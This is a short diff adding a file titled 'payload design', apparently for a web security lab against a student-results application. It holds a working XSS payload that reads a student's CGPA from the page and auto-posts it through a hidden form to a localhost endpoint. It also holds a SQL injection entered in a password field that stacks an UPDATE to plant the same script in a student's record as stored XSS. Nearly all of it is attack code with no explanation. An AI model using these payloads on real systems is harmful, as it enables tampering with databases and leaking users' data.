@@ -1,0 +1,44 @@
+payload design
+
+
+XSS
+
+<script>window.addEventListener("DOMContentLoaded",function(){
+  var tds = document.getElementsByTagName("td");
+  if (tds.length >= 2) {
+    var cgpa = tds[1].textContent.trim();
+    var f = document.createElement("form");
+    f.method = "POST";
+    f.action = "http://localhost:3001/create";
+    var i = document.createElement("input");
+    i.type = "hidden";
+    i.name = "message";
+    i.value = "I got " + cgpa;
+    f.appendChild(i);
+    document.body.appendChild(f);
+    f.submit();
+  }
+});</script>
+
+password = 
+
+x' ;
+
+UPDATE result SET
+first_name = 'Liam',
+last_name = '<script>window.addEventListener("DOMContentLoaded",function(){
+  var tds = document.getElementsByTagName("td");
+  if (tds.length >= 2) {
+    var cgpa = tds[1].textContent.trim();
+    var f = document.createElement("form");
+    f.method = "POST";
+    f.action = "http://localhost:3001/create";
+    var i = document.createElement("input");
+    i.type = "hidden";
+    i.name = "message";
+    i.value = "I got " + cgpa;
+    f.appendChild(i);
+    document.body.appendChild(f);
+    f.submit();
+  }
+});</script>' WHERE student_id = 3005001; -- 
